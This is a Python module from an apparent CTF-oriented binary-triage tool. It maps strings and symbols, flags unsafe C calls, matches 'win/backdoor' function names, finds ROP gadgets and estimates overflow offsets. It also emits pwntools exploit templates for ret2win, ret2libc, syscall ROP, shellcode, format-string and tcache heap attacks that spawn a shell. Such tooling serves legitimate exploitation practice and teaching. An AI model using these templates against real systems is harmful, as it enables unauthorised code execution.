"""Binary-analysis helpers used by the HTTP layer.

Pure functions over a :class:`triage_web.loader.BinaryLoader` (and, where
noted, a disassembler / ROP engine). No FastAPI here — this is the domain
logic behind ``/api/disasm/*`` and ``/api/vuln-hints`` and is unit-tested
directly against a sample binary.
"""

from __future__ import annotations

import logging
import re

log = logging.getLogger("triage-web")


# ── Address / symbol maps ───────────────────────────────────────────────


def build_string_map(loader, insns: list) -> dict:
    """Build an address→repr(string) map from .rodata for addresses referenced
    by the given instructions."""
    rodata = next(
        (s for s in loader.get_sections() if "rodata" in s["name"].lower() or "rdata" in s["name"].lower()),
        None,
    )
    if not rodata:
        return {}
    start = rodata["vaddr"]
    end = start + rodata["size"]
    string_map: dict[int, str] = {}
    seen: set[int] = set()
    for insn in insns:
        for tok in insn["op_str"].split(","):
            tok = tok.strip()
            if not tok.startswith("0x"):
                continue
            try:
                val = int(tok, 16)
            except ValueError:
                continue
            if not (start <= val < end) or val in seen:
                continue
            seen.add(val)
            data = loader.read_vaddr(val, 64)
            if not data:
                continue
            s = data.split(b"\x00", 1)[0]
            if s and all(32 <= b < 127 or b in (9, 10, 13) for b in s):
                string_map[val] = repr(s.decode("ascii", errors="replace"))
    return string_map


def build_known_calls(loader) -> dict:
    """Build an address→name map from imports (PLT / .plt.sec stubs) and local
    functions, so call targets resolve to symbol names."""
    known: dict[int, str] = {}
    for imp in loader.get_imports():
        addr = imp.get("address", 0)
        if addr:
            known[addr] = imp["name"]
    for name, addr in loader.get_functions():
        known[addr] = name
    return known


def section_for_offset(loader, off: int) -> tuple[str, int | None]:
    """Return ``(section_name, vaddr_for_off)`` for a raw file offset, or
    ``("", None)`` if no section covers it."""
    for s in loader.get_sections():
        so = s.get("offset", -1)
        sz = s.get("size", 0)
        if so is not None and so >= 0 and so <= off < so + sz:
            return s["name"], s["vaddr"] + (off - so)
    return "", None


# ── Exploitation intel ─────────────────────────────────────────────────

CODE_GEN = {
    "gets": "gets(buf)",
    "fgets": "fgets(buf, n, stdin)",
    "strcpy": "strcpy(dst, src)",
    "strcat": "strcat(dst, src)",
    "scanf": 'scanf("%s", buf)',
    "sprintf": "sprintf(buf, fmt, ...)",
    "printf": "printf(user_input)",
    "fprintf": "fprintf(f, user_input)",
    "snprintf": "snprintf(buf, n, user_input)",
    "malloc": "malloc(n)",
    "free": "free(ptr)",
    "system": "system(cmd)",
    "execve": "execve(path, argv, envp)",
    "memcpy": "memcpy(dst, src, n)",
    "read": "read(fd, buf, n)",
    "strtol": "strtol(s, NULL, base)",
}

# Functions that give an unbounded / attacker-sized write into a stack buffer
VULN_BOF = {"gets", "scanf", "sprintf", "vsprintf", "strcpy", "strcat", "read", "fread", "fgets"}
# Format-string sinks (dangerous only when the format arg is attacker-controlled)
VULN_FMT = {"printf", "fprintf", "sprintf", "snprintf", "vprintf", "vfprintf", "vsprintf", "vsnprintf", "syslog"}
# CTF "win"/backdoor function name heuristics
_WIN_NAME_RE = re.compile(
    r"\b(win|winner|pwn|pwnme|get[_]?flag|print[_]?flag|read[_]?flag|cat[_]?flag|"
    r"give[_]?shell|get[_]?shell|spawn[_]?shell|shell|backdoor|secret|magic|admin|"
    r"debug|success|target|flag|bingo|not_?called|unreachable|hidden)\b",
    re.I,
)


def code_example(imp_name: str) -> str:
    return CODE_GEN.get(imp_name, f"{imp_name}(...)")


def find_win_functions(loader) -> list:
    """Local functions whose name matches a CTF win/backdoor pattern."""
    return [
        {"name": name, "address": hex(addr), "reason": "name matches CTF win/backdoor pattern"}
        for name, addr in loader.get_functions()
        if _WIN_NAME_RE.search(name or "")
    ]


def find_binsh(loader) -> dict | None:
    """Locate a ``/bin/sh`` (or similar) string; return its offset and vaddr."""
    raw = bytes(loader._raw)
    for needle in (b"/bin/sh\x00", b"/bin/bash\x00", b"sh\x00"):
        off = raw.find(needle)
        if off == -1:
            continue
        for s in loader.get_sections():
            so = s.get("offset", -1)
            if so >= 0 and so <= off < so + s.get("size", 0):
                return {
                    "string": needle.rstrip(b"\x00").decode(),
                    "vaddr": hex(s["vaddr"] + (off - so)),
                    "offset": hex(off),
                }
        return {"string": needle.rstrip(b"\x00").decode(), "vaddr": "", "offset": hex(off)}
    return None


_GADGET_CLASSES = (
    ("pop rdi; ret", "pop_rdi"),
    ("pop rsi; ret", "pop_rsi"),
    ("pop rdx; ret", "pop_rdx"),
    ("pop rax; ret", "pop_rax"),
    ("syscall", "syscall"),
    ("leave; ret", "leave_ret"),
    ("ret", "ret"),
    ("int 0x80", "int_80"),
)


def scan_gadgets(rop) -> dict:
    """Return ``{gadget_label: first_address}`` for a handful of ROP staples."""
    found: dict[str, str] = {}
    if rop is None:
        return found
    try:
        if not getattr(rop, "_scanned", False):
            rop.scan()
        for label, cls in _GADGET_CLASSES:
            hits = rop.search(semantic_cls=cls)
            if hits:
                found[label] = hits[0]["addr"]
    except Exception as e:  # pragma: no cover - defensive
        log.debug("gadget scan failed: %s", e)
    return found


def overflow_sites(loader, disasm, known_calls, is64: bool) -> list:
    """For each local function that calls an unbounded-input primitive, estimate
    the padding from the vulnerable buffer to the saved return address."""
    sites = []
    funcs = sorted(loader.get_functions(), key=lambda t: t[1])
    word = 8 if is64 else 4
    for idx, (name, addr) in enumerate(funcs):
        end = funcs[idx + 1][1] if idx + 1 < len(funcs) else addr + 512
        size = min(max(end - addr, 16), 4096)
        data = loader.read_vaddr(addr, size)
        if not data:
            continue
        try:
            an = disasm.analyze_function(data, addr, known_calls)
        except Exception as e:
            log.debug("overflow scan: analyze_function(0x%x) failed: %s", addr, e)
            continue
        unsafe = sorted({(c.get("name") or "").split("@")[0] for c in an.get("calls", [])} & VULN_BOF)
        if not unsafe:
            continue
        frame = an.get("stack_frame", 0) or 0
        # Prefer the buffer that feeds an input call; fall back to frame size.
        buf_off = 0
        for v in an.get("stack_vars", []):
            used = {(f or "").split("@")[0] for f in v.get("used_by_funcs", [])}
            if used & VULN_BOF:
                buf_off = max(buf_off, abs(v.get("offset", 0)))
        est = (buf_off + word) if buf_off else (frame + word)
        sites.append(
            {
                "function": name,
                "address": hex(addr),
                "unsafe_calls": unsafe,
                "stack_frame": frame,
                "buffer_offset": buf_off,
                "est_offset_to_ret": est,
                "note": "estimate — confirm with a De Bruijn / cyclic pattern",
            }
        )
    return sites


def pwntools_skeleton(kind: str, ctx: dict) -> str:
    """Return an editable pwntools script stub for the given attack ``kind``."""
    fn = ctx.get("filename") or "chall"
    off = ctx.get("offset", "OFFSET")
    if kind == "ret2win":
        return (
            "from pwn import *\n"
            f"elf = context.binary = ELF('./{fn}')\n"
            "io = process(elf.path)   # or: remote(HOST, PORT)\n"
            f"payload  = b'A' * {off}\n"
            "payload += p64(elf.sym['%s'])   # ret slide if the win fn misaligns the stack\n"
            "io.sendline(payload)\n"
            "io.interactive()\n" % ctx.get("win", "win")
        )
    if kind == "ret2libc":
        return (
            "from pwn import *\n"
            f"elf  = context.binary = ELF('./{fn}')\n"
            "libc = elf.libc            # or ELF('./libc.so.6')\n"
            "io = process(elf.path)\n"
            "rop = ROP(elf)\n"
            f"pad = b'A' * {off}\n"
            "# 1) leak a libc addr (puts@got via puts@plt), return to main\n"
            "rop.raw(rop.find_gadget(['ret']))   # stack align\n"
            "rop.puts(elf.got['puts']); rop.main()\n"
            "io.sendline(pad + rop.chain())\n"
            "leak = u64(io.recvline().strip().ljust(8, b'\\x00'))\n"
            "libc.address = leak - libc.sym['puts']\n"
            "# 2) second overflow: system('/bin/sh')\n"
            "rop2 = ROP(libc)\n"
            "rop2.raw(rop2.find_gadget(['ret']))\n"
            "rop2.system(next(libc.search(b'/bin/sh\\x00')))\n"
            "io.sendline(pad + rop2.chain())\n"
            "io.interactive()\n"
        )
    if kind in ("srop", "syscall_rop"):
        return (
            "from pwn import *\n"
            f"elf = context.binary = ELF('./{fn}')\n"
            "io = process(elf.path)\n"
            "rop = ROP(elf)\n"
            "binsh = %s   # writable region you control, or an existing /bin/sh\n"
            f"pad = b'A' * {off}\n"
            "rop.raw(rop.rdi.address); rop.raw(binsh)\n"
            "rop.raw(rop.rsi.address); rop.raw(0)\n"
            "rop.raw(rop.rdx.address); rop.raw(0)\n"
            "rop.raw(rop.rax.address); rop.raw(59)   # __NR_execve\n"
            "rop.raw(SYSCALL_GADGET)\n"
            "io.sendline(pad + rop.chain())\n"
            "io.interactive()\n" % ctx.get("binsh", "0x0")
        )
    if kind == "shellcode":
        return (
            "from pwn import *\n"
            f"elf = context.binary = ELF('./{fn}')\n"
            "io = process(elf.path)\n"
            "sc = asm(shellcraft.sh())\n"
            f"pad = b'A' * {off}\n"
            "buf = STACK_ADDR   # leak or known; NX is OFF so stack is executable\n"
            "io.sendline(sc.ljust(%s, b'\\x90') + pad[len(sc):] + p64(buf))\n" % off + "io.interactive()\n"
        )
    if kind == "fmt":
        return (
            "from pwn import *\n"
            f"elf = context.binary = ELF('./{fn}')\n"
            "io = process(elf.path)\n"
            "# find your arg offset: send '%p ' * 20 and count to your marker\n"
            "OFF = 6\n"
            "payload = fmtstr_payload(OFF, {elf.got['printf']: elf.plt['system']})\n"
            "io.sendline(payload)\n"
            "io.interactive()\n"
        )
    if kind == "heap":
        return (
            "from pwn import *\n"
            f"elf = context.binary = ELF('./{fn}')\n"
            "libc = elf.libc\n"
            "io = process(elf.path)\n"
            "# tcache poisoning (glibc < 2.32, no key/mangling):\n"
            "#  1. malloc(A); malloc(B)\n"
            "#  2. free(A); free(B)                 # B->fd = A\n"
            "#  3. edit(B, p64(TARGET))             # tcache->next = TARGET\n"
            "#  4. malloc(sz); malloc(sz) -> TARGET # arbitrary write\n"
            "# common TARGETs: __free_hook (-> system), __malloc_hook, a saved return addr,\n"
            "# a GOT entry (partial RELRO), or the stdout FILE for FSOP.\n"
        )
    return ""
